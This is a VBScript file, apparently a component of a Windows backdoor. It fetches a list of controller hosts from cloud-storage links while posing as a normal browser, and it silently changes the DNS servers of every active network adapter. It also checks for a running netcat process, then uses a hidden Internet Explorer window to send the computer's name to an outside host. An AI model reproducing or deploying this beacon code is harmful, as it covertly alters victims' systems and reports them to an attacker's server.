On Error Resume Next
set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
set xmlhttpdirect = createobject ("Msxml2.ServerXMLHTTP")
dim url,mac
  'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
  'url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
  url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
  'url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
'msgbox  url&"site.txt"
'xmlhttp.open "get", url&"site.txt", false

xmlhttp.open "get", url, false

xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
xmlhttp.send
strOutput = xmlhttp.responseText
if (left(strOutput,6)="<HTML>") then
    url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
    xmlhttp.open "get", url, false

    xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
    xmlhttp.send
    strOutput = xmlhttp.responseText
end if
'msgbox strOutput
a=Split(strOutput,",")
Set oShell = CreateObject ("WScript.Shell") 
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")

Set colAdapters = objWMIService.ExecQuery _
    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
for each nad in colAdapters
    If Not IsNull(Nad.DefaultIPGateway) Then
      if not isnull(Nad.MACAddress) then
       mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
       arrDNSServers = Array("8.8.8.8", "8.8.8.8")
        nad.SetDNSServerSearchOrder(arrDNSServers)
      end if
    end if  
next 
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process where name='nc64.exe'")
'msgbox colitems
dim brun
'brun=true
For Each objItem in colItems
    'msgbox objItem.name & " " & objItem.ProcessID & " " & objItem.CommandLine
    'If objItem.name = "Calculator.exe" then objItem.terminate
    brun=false
Next
dim arr
  for each x in a
      'msgbox x
      
      'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
      
      'xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
      'Wscript.Echo x
      if (x="http://troglo.homepc.it") then
      
        Set IE = WScript.CreateObject("InternetExplorer.Application", "IE_")
        IE.Visible = false
        IE.Navigate x&"/fiddler/fiddler.php"
        

        'Wait til DOM is ready
        Do Until IE.ReadyState = 4 : Loop
        'WScript.Echo IE.document.body.innerText
        strOutput =IE.document.body.innerText
        'If IsObject(IE.Document.GetElementById("nav-tags")) Then
        '    IE.Document.GetElementById("nav-tags").Click()
        'End If
        
        'xmlhttp.setProxy "2", "127.0.0.1:8888", "<local>"
        'xmlhttp.open "get", x&"/fiddler/fiddler.php", false
        'xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
        'xmlhttp.send
        'strOutput = xmlhttp.responseText
        'Wscript.Echo strOutput
        if (left(strOutput,2)<>"ok") then
           'Wscript.Echo "bad"
           'xmlhttpdirect.open "get", x&"/trade/alert.php?q="&strComputerName, false 
           'xmlhttpdirect.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
           'xmlhttpdirect.send
           IE.Navigate x&"/trade/alert.php?pc="&strComputerName
        

           'Wait til DOM is ready
           Do Until IE.ReadyState = 4 : Loop
        end if
        
        IE.Quit
        Set IE = Nothing
      end if 
      
      
      
      WScript.Sleep 100
      
  next
'oShell.run "taskkill /f /im iexplore.exe",false
rem oShell.run "taskkill /f /im wscript.exe"
'dim WMI:  set WMI = GetObject("winmgmts:\\.\root\cimv2")
'dim Nads: set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 
'dim nad



'strOutput = split(xmlhttp.responseText,"Stable release</a>")(1)
'strOutput = split(strOutput,"<small>")(0)
'strOutput = replace(replace(strOutput,vbcr,""),vblf,"")
'strOutput = split(strOutput,"<p>")(1)

'msgbox "Version: " & strOutput